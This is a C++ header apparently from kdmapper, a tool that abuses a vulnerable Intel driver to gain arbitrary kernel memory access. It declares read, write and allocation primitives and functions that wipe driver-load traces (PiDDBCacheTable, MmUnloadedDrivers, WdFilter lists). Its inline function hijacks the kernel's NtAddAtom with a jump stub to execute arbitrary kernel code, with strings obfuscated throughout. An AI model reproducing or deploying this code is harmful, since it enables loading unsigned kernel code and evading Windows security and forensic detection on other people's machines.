#pragma once
#include <Windows.h>
#include <string>
#include <iostream>
#include <mutex>
#include <random>

#include "utils.hpp"
#include "nt.hpp"
#include "xorstr.hpp"

namespace intel_driver
{
	constexpr ULONG32 ioctl1 = 0x80862007;
	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;

	bool ClearPiDDBCacheTable();
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	NTSTATUS AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList();
	bool ClearWdFilterDriverList();

	bool IsRunning();
	NTSTATUS Load();
	NTSTATUS Unload();

	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(uint64_t address, uint32_t size);
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
	
	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);

	bool FreePool(uint64_t address);
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers();
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	inline std::mutex& GetHookLock() {
		static std::mutex mtx;
		return mtx;
	}


	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;
		static_assert(sizeof...(A) <= 4, "CallKernelFunction: Too many arguments, max 4");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}

		if (!kernel_function_address)
			return false;

		std::lock_guard<std::mutex> guard(GetHookLock());

		HMODULE ntdll = GetModuleHandleA(_xor_a("ntdll.dll").c_str());
		if (ntdll == NULL)
			return false;

		static void* user_target_fn = nullptr;
		static uint64_t kernel_target_fn = 0;

		if (!user_target_fn || !kernel_target_fn) {
			std::string primarySyscall = _xor_a("NtAddAtom");
			user_target_fn = reinterpret_cast<void*>(GetProcAddress(ntdll, primarySyscall.c_str()));
			if (user_target_fn) {
				kernel_target_fn = GetKernelModuleExport(intel_driver::ntoskrnlAddr, primarySyscall);
			}

			if (!user_target_fn || !kernel_target_fn) {
				std::string fallbackSyscall = _xor_a("NtTraceControl");
				user_target_fn = reinterpret_cast<void*>(GetProcAddress(ntdll, fallbackSyscall.c_str()));
				kernel_target_fn = GetKernelModuleExport(intel_driver::ntoskrnlAddr, fallbackSyscall);
			}

			if (!user_target_fn || !kernel_target_fn) {
				kdmLog(L"[-] Failed to resolve kernel invocation target" << std::endl);
				return false;
			}
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)] = { 0 };
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		if (!ReadMemory(kernel_target_fn, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			kdmLog(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		if (!WriteToReadOnlyMemory(kernel_target_fn, kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(user_target_fn);
			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(user_target_fn);
			Function(arguments...);
		}

		return WriteToReadOnlyMemory(kernel_target_fn, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
